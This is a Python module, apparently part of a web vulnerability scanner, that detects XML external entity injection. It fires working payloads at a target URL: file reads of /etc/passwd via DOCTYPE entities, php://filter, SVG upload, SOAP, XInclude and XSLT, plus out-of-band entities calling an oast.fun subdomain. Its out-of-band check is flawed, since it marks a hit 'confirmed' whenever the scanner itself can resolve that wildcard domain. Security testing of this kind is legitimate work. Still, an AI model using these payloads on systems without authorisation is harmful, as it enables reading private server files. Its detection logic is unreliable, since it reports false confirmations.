"""
XXE Detector: XML External Entity injection detection with multiple techniques.

Detection Methods:
  1. In-band file read (classic XXE)
  2. Error-based XXE (blind via error messages)
  3. Out-of-band XXE (DNS callback)
  4. SVG upload XXE (file upload vector)
  5. SOAP/REST XML injection
  6. XInclude injection
  7. XSLT injection (secondary)
"""
import random
import re
import string
import time
from typing import Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests

from tools.http_client import HttpClient
from tools.log_utils import get_logger
from tools.settings import settings

logger = get_logger("xxe")


FILE_READ_PAYLOADS = [
    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>''',

    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<data>&xxe;</data>''',

    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://127.0.0.1:8888/xxe.dtd">
  %dtd;
]>
<data>&send;</data>''',
]

ERROR_PAYLOADS = [
    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///nonexistent_aimy_xxe_file_12345">
]>
<data>&xxe;</data>''',

    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<data>&xxe;</data>''',
]

OOB_PAYLOADS = [
    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://{domain}/">
]>
<data>&xxe;</data>''',

    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://{domain}/xxe.dtd">
  %dtd;
]>
<data>&send;</data>''',
]

XINCLUDE_PAYLOADS = [
    '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>''',

    '''<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/hostname"/>
</foo>''',
]

SOAP_PAYLOADS = [
    '''<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <data>
      <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
      ]>
      <value>&xxe;</value>
    </data>
  </soap:Body>
</soap:Envelope>''',
]

SVG_PAYLOADS = [
    '''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>''',
]

XSLT_PAYLOADS = [
    '''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>''',
]


class XXEDetector:
    """
    XXE injection detector with multiple detection techniques.

    Usage:
        detector = XXEDetector(sess, timeout)
        result = detector.check(url, param)
    """

    def __init__(self, sess: 'requests.Session' = None, timeout: float = 10.0,
                 waf_name: str = None):
        self.sess = sess or HttpClient()
        self.timeout = timeout
        self.waf_name = waf_name
        self.oob_server = None

    def _random_suffix(self, length=8) -> str:
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def _inject_param(self, url: str, param: str, value: str) -> str:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [value]
        new_qs = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_qs))

    def _make_request(self, url: str, method="GET", data=None,
                      headers=None, raw_body=None, **kwargs) -> Tuple[Optional[int], str, float]:
        try:
            start = time.time()
            if raw_body is not None:
                resp = self.sess.post(url, data=raw_body, headers=headers,
                                      timeout=self.timeout, allow_redirects=False, verify=settings.verify_ssl)
            elif method == "POST":
                resp = self.sess.post(url, data=data, headers=headers,
                                      timeout=self.timeout, allow_redirects=False, verify=settings.verify_ssl)
            else:
                resp = self.sess.get(url, headers=headers, timeout=self.timeout,
                                     allow_redirects=False, verify=settings.verify_ssl)
            elapsed = time.time() - start
            return resp.status_code, resp.text, elapsed
        except Exception as e:
            logger.debug("Request failed: %s", e)
            return None, "", 0.0

    def check(self, url: str, param: str = None, **kwargs) -> Dict:
        findings = []
        is_post = kwargs.get("is_post", False)
        post_data = kwargs.get("data")

        if param:
            findings.extend(self._check_param_based(url, param, is_post, post_data))
        findings.extend(self._check_endpoint_xml(url))
        findings.extend(self._check_svg_upload(url))
        findings.extend(self._check_xinclude(url))
        findings.extend(self._check_soap(url))
        findings.extend(self._check_xslt(url))

        confirmed = [f for f in findings if f.get("confirmed")]
        high_conf = [f for f in findings if f.get("confidence", 0) > 0.6]

        return {
            "vulnerable": len(confirmed) > 0,
            "vuln_type": "xxe",
            "confidence": max([f.get("confidence", 0) for f in findings], default=0),
            "findings": findings,
            "confirmed_count": len(confirmed),
            "high_confidence_count": len(high_conf),
        }

    def _check_param_based(self, url: str, param: str,
                           is_post: bool, post_data: Dict) -> List[Dict]:
        findings = []

        # Method 1: In-band file read
        for payload in FILE_READ_PAYLOADS[:2]:
            try:
                if is_post and post_data:
                    test_data = dict(post_data)
                    test_data[param] = payload
                    headers = {"Content-Type": "application/xml"}
                    _, body, _ = self._make_request(url, "POST", test_data, headers)
                else:
                    test_url = self._inject_param(url, param, payload)
                    _, body, _ = self._make_request(test_url, "GET")

                if body:
                    if "root:" in body or re.search(r'uid=\d+', body):
                        findings.append({
                            "method": "in_band_file_read",
                            "payload": payload[:200],
                            "confidence": 0.85,
                            "confirmed": True,
                            "evidence": body[:300],
                            "file": "/etc/passwd",
                        })
                        break
            except Exception as e:
                logger.debug("In-band XXE check failed: %s", e)

        # Method 2: Error-based detection
        for payload in ERROR_PAYLOADS[:1]:
            try:
                if is_post and post_data:
                    test_data = dict(post_data)
                    test_data[param] = payload
                    headers = {"Content-Type": "application/xml"}
                    _, body, _ = self._make_request(url, "POST", test_data, headers)
                else:
                    test_url = self._inject_param(url, param, payload)
                    _, body, _ = self._make_request(test_url, "GET")

                if body:
                    error_patterns = [
                        r'xml.*error', r'entity.*not.*defined', r'external.*entity',
                        r'xml.*parser', r'dtd.*error', r'no such file',
                        r'failed to load', r'xmlreader',
                    ]
                    for pattern in error_patterns:
                        if re.search(pattern, body, re.I):
                            findings.append({
                                "method": "error_based",
                                "payload": payload[:200],
                                "confidence": 0.60,
                                "confirmed": False,
                                "evidence": body[:300],
                                "error_pattern": pattern,
                            })
                            break
            except Exception as e:
                logger.debug("Error-based XXE check failed: %s", e)

        # Method 3: OOB detection (DNS callback)
        try:
            oob_domain = "aimy-xxe-%s.oast.fun" % self._random_suffix(6)
            for payload_template in OOB_PAYLOADS[:1]:
                payload = payload_template.replace("{domain}", oob_domain)
                if is_post and post_data:
                    test_data = dict(post_data)
                    test_data[param] = payload
                    headers = {"Content-Type": "application/xml"}
                    self._make_request(url, "POST", test_data, headers)
                else:
                    test_url = self._inject_param(url, param, payload)
                    self._make_request(test_url, "GET")

                time.sleep(2)
                import socket
                try:
                    resolved = socket.getaddrinfo(oob_domain, 80)
                    if resolved:
                        findings.append({
                            "method": "oob_dns",
                            "payload": payload[:200],
                            "confidence": 0.90,
                            "confirmed": True,
                            "oob_domain": oob_domain,
                            "resolved": True,
                        })
                        break
                except socket.gaierror:
                    pass
        except Exception as e:
            logger.debug("OOB XXE check failed: %s", e)

        return findings

    def _check_endpoint_xml(self, url: str) -> List[Dict]:
        findings = []
        try:
            payload = FILE_READ_PAYLOADS[0]
            headers = {"Content-Type": "application/xml"}
            _, body, _ = self._make_request(url, "POST", raw_body=payload, headers=headers)
            if body and "root:" in body:
                findings.append({
                    "method": "direct_xml_endpoint",
                    "payload": payload[:200],
                    "confidence": 0.80,
                    "confirmed": True,
                    "evidence": body[:300],
                })
        except Exception as e:
            logger.debug("Direct XML endpoint check failed: %s", e)
        return findings

    def _check_svg_upload(self, url: str) -> List[Dict]:
        findings = []
        try:
            for payload in SVG_PAYLOADS[:1]:
                headers = {"Content-Type": "image/svg+xml"}
                upload_urls = [url, url.rstrip("/") + "/upload", url.rstrip("/") + "/api/upload"]
                for upload_url in upload_urls:
                    _, body, _ = self._make_request(upload_url, "POST", raw_body=payload, headers=headers)
                    if body and "root:" in body:
                        findings.append({
                            "method": "svg_upload",
                            "payload": payload[:200],
                            "confidence": 0.80,
                            "confirmed": True,
                            "evidence": body[:300],
                            "upload_url": upload_url,
                        })
                        break
        except Exception as e:
            logger.debug("SVG upload XXE check failed: %s", e)
        return findings

    def _check_xinclude(self, url: str) -> List[Dict]:
        findings = []
        for payload in XINCLUDE_PAYLOADS[:1]:
            try:
                headers = {"Content-Type": "application/xml"}
                _, body, _ = self._make_request(url, "POST", raw_body=payload, headers=headers)
                if body and "root:" in body:
                    findings.append({
                        "method": "xinclude",
                        "payload": payload[:200],
                        "confidence": 0.75,
                        "confirmed": True,
                        "evidence": body[:300],
                    })
                    break
            except Exception as e:
                logger.debug("XInclude check failed: %s", e)
        return findings

    def _check_soap(self, url: str) -> List[Dict]:
        findings = []
        for payload in SOAP_PAYLOADS[:1]:
            try:
                headers = {"Content-Type": "text/xml; charset=utf-8"}
                _, body, _ = self._make_request(url, "POST", raw_body=payload, headers=headers)
                if body and "root:" in body:
                    findings.append({
                        "method": "soap_injection",
                        "payload": payload[:200],
                        "confidence": 0.75,
                        "confirmed": True,
                        "evidence": body[:300],
                    })
                    break
            except Exception as e:
                logger.debug("SOAP XXE check failed: %s", e)
        return findings

    def _check_xslt(self, url: str) -> List[Dict]:
        findings = []
        for payload in XSLT_PAYLOADS[:1]:
            try:
                headers = {"Content-Type": "application/xml"}
                xslt_urls = [url, url.rstrip("/") + "/transform", url.rstrip("/") + "/xslt"]
                for xslt_url in xslt_urls:
                    _, body, _ = self._make_request(xslt_url, "POST", raw_body=payload, headers=headers)
                    if body and "root:" in body:
                        findings.append({
                            "method": "xslt_injection",
                            "payload": payload[:200],
                            "confidence": 0.70,
                            "confirmed": True,
                            "evidence": body[:300],
                            "xslt_url": xslt_url,
                        })
                        break
            except Exception as e:
                logger.debug("XSLT XXE check failed: %s", e)
        return findings


def check(url: str, param: str = None, sess=None, timeout: float = 10.0, **kwargs) -> Dict:
    detector = XXEDetector(sess, timeout, **kwargs)
    return detector.check(url, param, **kwargs)
